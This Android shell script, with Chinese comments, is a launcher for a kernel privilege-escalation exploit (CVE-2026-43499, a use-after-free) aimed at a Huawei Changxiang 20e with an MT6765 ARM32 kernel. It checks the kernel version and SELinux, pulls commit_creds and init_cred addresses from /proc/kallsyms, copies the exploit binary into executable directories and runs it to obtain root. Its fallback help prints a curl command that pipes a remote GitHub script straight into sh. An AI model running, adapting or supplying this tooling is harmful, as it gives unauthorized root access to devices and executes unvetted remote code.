#!/system/bin/sh
# ============================================================
# CVE-2026-43499 ARM32 Exploit - MT管理器直接运行版
# 内核 1: boot.img (zImage ARM32, 4.14.141+)
# 目标: Huawei Changxiang 20e (MLD-AL10, MT6765)
#
# 使用方法:
#   1. 将 exploit 和 run_boot.sh 复制到手机任意目录
#      (推荐: /sdcard/Download/cve_2026_43499/)
#   2. 用MT管理器打开该目录
#   3. 点击 run_boot.sh → 选择"打开方式" → "终端" 或 "执行"
#   4. 或者打开MT管理器终端, 输入:
#      cd /sdcard/Download/cve_2026_43499
#      sh run_boot.sh
#
# 参数:
#   sh run_boot.sh            # 完整exploit (自动提取符号)
#   sh run_boot.sh -t         # 测试模式 (仅触发UAF, 不提权)
#   sh run_boot.sh -d         # 尝试debug spinlock布局
#   sh run_boot.sh 0xADDR ... # 手动指定符号地址
#
# 本脚本针对 boot.img (ARM32 zImage内核):
#   - 内核地址范围 0xC0000000 - 0xFFFFFFFF (ARM32)
#   - unsigned long = 4字节, 与内核指针匹配
#   - 通过 /proc/kallsyms 自动提取符号 (需 kptr_restrict=0)
# ============================================================

# ── 获取脚本所在目录 ──
SCRIPT_DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
if [ -z "$SCRIPT_DIR" ]; then
    SCRIPT_DIR="$PWD"
fi

# 如果还是空的, 用 $0 推导
if [ -z "$SCRIPT_DIR" ] || [ "$SCRIPT_DIR" = "/" ]; then
    case "$0" in
        /*) SCRIPT_DIR="$(dirname "$0")" ;;
        *) SCRIPT_DIR="$PWD" ;;
    esac
fi

EXPLOIT="$SCRIPT_DIR/exploit"
LOG_FILE="$SCRIPT_DIR/cve_2026_43499_boot.log"

# ── 兼容 MT管理器的 echo ──
print_msg() {
    printf '%s\n' "$1"
}

print_msg ""
print_msg "============================================"
print_msg " CVE-2026-43499 ARM32 Exploit"
print_msg " 内核 1: boot.img (zImage ARM32)"
print_msg " Target: MT6765 (Huawei Changxiang 20e)"
print_msg "============================================"
print_msg ""

# ── 检查是否已经是 root ──
if [ "$(id -u)" = "0" ] 2>/dev/null; then
    print_msg "[+] 已经是 root!"
    exit 0
fi

# ── 检查架构 ──
ARCH=$(uname -m 2>/dev/null)
print_msg "[*] 架构: $ARCH"
case "$ARCH" in
    armv7l|armv8l)
        print_msg "[+] ARM32 架构确认 - 与 boot.img 内核匹配"
        ;;
    aarch64|arm64)
        print_msg "[!] 警告: 当前内核是 ARM64"
        print_msg "[!] boot.img 是 ARM32 zImage, 当前内核不匹配"
        print_msg "[!] 如需使用 BOOT.img (华为畅享10e ARM64内核), 请用 run_boot10e.sh"
        print_msg "[!] 继续尝试 (设备可能支持32位兼容模式)..."
        ;;
    *)
        print_msg "[!] 警告: 未知架构 $ARCH"
        ;;
esac

# ── 检查内核版本 ──
KVER=$(uname -r 2>/dev/null)
print_msg "[*] 内核: $KVER"

KMAJOR=$(echo "$KVER" | cut -d. -f1)
KMINOR=$(echo "$KVER" | cut -d. -f2)
print_msg "[*] 内核版本: $KMAJOR.$KMINOR"

# 检查是否在受影响范围内 (2.6.39 ~ 7.1)
VULN=0
if [ "$KMAJOR" -gt 2 ] 2>/dev/null; then
    if [ "$KMAJOR" -lt 7 ] 2>/dev/null; then
        VULN=1
    elif [ "$KMAJOR" = "7" ] 2>/dev/null && [ "$KMINOR" -le 1 ] 2>/dev/null; then
        VULN=1
    fi
elif [ "$KMAJOR" = "2" ] 2>/dev/null && [ "$KMINOR" -ge 39 ] 2>/dev/null; then
    VULN=1
fi

if [ "$VULN" = "1" ]; then
    print_msg "[+] 内核版本在受影响范围内 (2.6.39 ~ 7.1)"
else
    print_msg "[!] 内核版本可能不受影响"
    print_msg "[!] 继续尝试..."
fi

# ── 检查 CPU 信息 ──
CPU_CORES=0
if [ -f /proc/cpuinfo ]; then
    CPU_CORES=$(grep -c ^processor /proc/cpuinfo 2>/dev/null)
    print_msg "[*] CPU 核心数: $CPU_CORES"
    if [ "$CPU_CORES" -lt 2 ] 2>/dev/null; then
        print_msg "[!] 警告: 需要至少 2 个核心"
    fi
fi

# ── 检查 exploit 二进制 ──
if [ ! -f "$EXPLOIT" ]; then
    print_msg "[-] 找不到 exploit 二进制: $EXPLOIT"
    print_msg "[-] 请确保 exploit 文件与此脚本在同一目录"
    print_msg "[-] 当前目录: $SCRIPT_DIR"
    print_msg "[-] 目录内容:"
    ls -la "$SCRIPT_DIR" 2>/dev/null
    exit 1
fi

# 设置可执行权限
chmod 755 "$EXPLOIT" 2>/dev/null
if [ ! -x "$EXPLOIT" ]; then
    print_msg "[!] 无法设置执行权限 (noexec 文件系统)"
    
    # 尝试多个可执行目录
    EXEC_DIRS=""
    
    # 1. Termux home (如果有 Termux)
    TERMUX_HOME="/data/data/com.termux/files/home"
    if [ -d "$TERMUX_HOME" ] && [ -w "$TERMUX_HOME" ]; then
        EXEC_DIRS="$EXEC_DIRS $TERMUX_HOME/cve_2026_43499"
    fi
    
    # 2. Termux tmp
    if [ -d "/data/data/com.termux/files/usr/tmp" ] && [ -w "/data/data/com.termux/files/usr/tmp" ]; then
        EXEC_DIRS="$EXEC_DIRS /data/data/com.termux/files/usr/tmp"
    fi
    
    # 3. /data/local/tmp (需要 shell 权限)
    EXEC_DIRS="$EXEC_DIRS /data/local/tmp"
    
    # 4. $HOME/.local/bin
    if [ -n "$HOME" ] && [ "$HOME" != "/" ]; then
        EXEC_DIRS="$EXEC_DIRS $HOME/.local/bin"
    fi
    
    # 5. $TMPDIR
    if [ -n "$TMPDIR" ] && [ -d "$TMPDIR" ]; then
        EXEC_DIRS="$EXEC_DIRS $TMPDIR"
    fi
    
    COPIED=0
    for DIR in $EXEC_DIRS; do
        mkdir -p "$DIR" 2>/dev/null
        if cp "$EXPLOIT" "$DIR/exploit" 2>/dev/null; then
            chmod 755 "$DIR/exploit" 2>/dev/null
            if [ -x "$DIR/exploit" ]; then
                EXPLOIT="$DIR/exploit"
                print_msg "[+] 已复制到 $DIR"
                COPIED=1
                break
            else
                rm -f "$DIR/exploit" 2>/dev/null
            fi
        fi
    done
    
    if [ "$COPIED" = "0" ]; then
        print_msg "[-] 无法复制到可执行目录"
        print_msg ""
        print_msg "解决方案:"
        print_msg ""
        print_msg "方案1: 安装 Termux (推荐)"
        print_msg "  在手机应用商店安装 Termux"
        print_msg "  打开 Termux, 运行:"
        print_msg "    pkg install curl"
        print_msg "    curl -sL https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/install_termux.sh | sh"
        print_msg "    cd ~/cve_2026_43499 && sh run_boot.sh -t"
        print_msg ""
        print_msg "方案2: 用 ADB (需要电脑)"
        print_msg "  adb push exploit /data/local/tmp/"
        print_msg "  adb shell chmod 755 /data/local/tmp/exploit"
        print_msg "  adb shell /data/local/tmp/exploit"
        exit 1
    fi
fi

# ── 检查 /dev/null 可访问性 ──
if [ ! -c /dev/null ]; then
    print_msg "[!] /dev/null 不可用, exploit 触发阶段可能失败"
fi

# ── 尝试读取 /proc/kallsyms ──
print_msg ""
print_msg "[*] 检查 /proc/kallsyms..."

SYMS_AVAILABLE=0
COMMIT_CREDS=""
INIT_CRED=""
NULL_FOPS=""
INIT_TASK=""

if [ -r /proc/kallsyms ]; then
    CC=$(grep -m1 -w "commit_creds" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    IC=$(grep -m1 -w "init_cred" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    NF=$(grep -m1 -w "null_fops" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    IT=$(grep -m1 -w "init_task" /proc/kallsyms 2>/dev/null | awk '{print $1}')

    # 检查地址是否非零 (kptr_restrict=0)
    # ARM32: 地址应为 8 位 hex (32位)
    # ARM64: 地址为 16 位 hex (64位) - 本脚本针对ARM32, 不适用
    if [ -n "$CC" ] && [ "$CC" != "0000000000000000" ] && [ "$CC" != "00000000" ] && [ "$CC" != "0" ]; then
        # 检查地址长度, ARM32 应为 8 位
        CC_LEN=${#CC}
        if [ "$CC_LEN" -le 8 ]; then
            COMMIT_CREDS="0x$CC"
            INIT_CRED="0x$IC"
            NULL_FOPS="0x$NF"
            INIT_TASK="0x$IT"
            SYMS_AVAILABLE=1
            print_msg "[+] kallsyms 可用 (ARM32 地址, kptr_restrict=0)"
            print_msg "[+]   commit_creds = $COMMIT_CREDS"
            print_msg "[+]   init_cred    = $INIT_CRED"
            if [ -n "$NULL_FOPS" ] && [ "$NULL_FOPS" != "0x00000000" ] && [ "$NULL_FOPS" != "0x" ]; then
                print_msg "[+]   null_fops    = $NULL_FOPS"
            else
                print_msg "[+]   null_fops    = (未找到, exploit将自动查找)"
                NULL_FOPS=""
            fi
            if [ -n "$INIT_TASK" ] && [ "$INIT_TASK" != "0x00000000" ] && [ "$INIT_TASK" != "0x" ]; then
                print_msg "[+]   init_task    = $INIT_TASK"
            else
                print_msg "[+]   init_task    = (未找到)"
                INIT_TASK=""
            fi
        else
            print_msg "[!] kallsyms 返回 ARM64 地址 (长度 $CC_LEN)"
            print_msg "[!] 当前内核是 64位, boot.img (ARM32) 不适用"
            print_msg "[!] 请使用 run_boot10e.sh 针对 BOOT.img"
            print_msg "[!] 或者刷入 boot.img 后再运行本脚本"
        fi
    else
        print_msg "[!] kallsyms 地址被屏蔽 (kptr_restrict > 0)"
        print_msg "[!] 需要手动提供地址"
    fi
else
    print_msg "[!] /proc/kallsyms 不可读"
    print_msg "[!] 需要手动提供地址"
fi

# ── 检查 kptr_restrict ──
if [ -f /proc/sys/kernel/kptr_restrict ]; then
    KPTR=$(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)
    print_msg "[*] kptr_restrict = $KPTR"
fi

# ── 检查 SELinux ──
if [ -f /sys/fs/selinux/enforce ]; then
    SELINUX=$(cat /sys/fs/selinux/enforce 2>/dev/null)
    if [ "$SELINUX" = "1" ]; then
        print_msg "[*] SELinux: Enforcing"
        print_msg "[!] SELinux 强制模式, exploit 可能被阻止"
    else
        print_msg "[*] SELinux: Permissive"
    fi
elif [ -f /proc/self/attr/current ]; then
    SECONTEXT=$(cat /proc/self/attr/current 2>/dev/null)
    print_msg "[*] SELinux context: $SECONTEXT"
fi

# ── 构建命令行参数 ──
ARGS=""

# 透传用户参数
USER_ARGS=""
while [ $# -gt 0 ]; do
    case "$1" in
        -t|-d|-h)
            USER_ARGS="$USER_ARGS $1"
            shift
            ;;
        0x*|0X*)
            USER_ARGS="$USER_ARGS $1"
            shift
            ;;
        *)
            shift
            ;;
    esac
done

# 如果 kallsyms 可用且用户没有手动提供地址, 自动传入
if [ "$SYMS_AVAILABLE" = "1" ]; then
    case "$USER_ARGS" in
        *0x*|*0X*)
            ARGS="$USER_ARGS"
            ;;
        *)
            ARGS="$USER_ARGS $COMMIT_CREDS $INIT_CRED"
            if [ -n "$NULL_FOPS" ] && [ "$NULL_FOPS" != "0x" ]; then
                ARGS="$ARGS $NULL_FOPS"
            fi
            if [ -n "$INIT_TASK" ] && [ "$INIT_TASK" != "0x" ]; then
                ARGS="$ARGS $INIT_TASK"
            fi
            ;;
    esac
else
    ARGS="$USER_ARGS"
fi

# ── 运行 exploit ──
print_msg ""
print_msg "============================================"
print_msg "[*] 开始运行 exploit (boot.img 内核模式)..."
print_msg "[*] 命令: $EXPLOIT $ARGS"
print_msg "============================================"
print_msg ""

# 运行并保存日志
"$EXPLOIT" $ARGS 2>&1 | tee "$LOG_FILE"
EXIT_CODE=$?

print_msg ""
print_msg "============================================"
if [ $EXIT_CODE -eq 0 ]; then
    print_msg "[+] EXPLOIT 成功!"
    print_msg "[+] 日志已保存: $LOG_FILE"
else
    print_msg "[-] Exploit 失败 (退出码: $EXIT_CODE)"
    print_msg "[-] 日志已保存: $LOG_FILE"
    print_msg ""
    print_msg "故障排除:"
    print_msg "  1. 先运行 'sh run_boot.sh -t' 确认 UAF 是否触发"
    print_msg "  2. 如果测试模式崩溃重启, 说明漏洞存在"
    print_msg "  3. 尝试 'sh run_boot.sh -d' 使用 debug 布局"
    print_msg "  4. 如果 kallsyms 被限制, 手动提供地址:"
    print_msg "     sh run_boot.sh 0x<commit_creds> 0x<init_cred> 0x<null_fops> 0x<init_task>"
    print_msg "  5. 检查 SELinux 是否阻止 (setenforce 0 需要 root)"
    print_msg "  6. 如果当前内核是 ARM64, 改用 run_boot10e.sh"
    print_msg ""
    print_msg "日志内容:"
    head -50 "$LOG_FILE" 2>/dev/null
fi
print_msg "============================================"

exit $EXIT_CODE
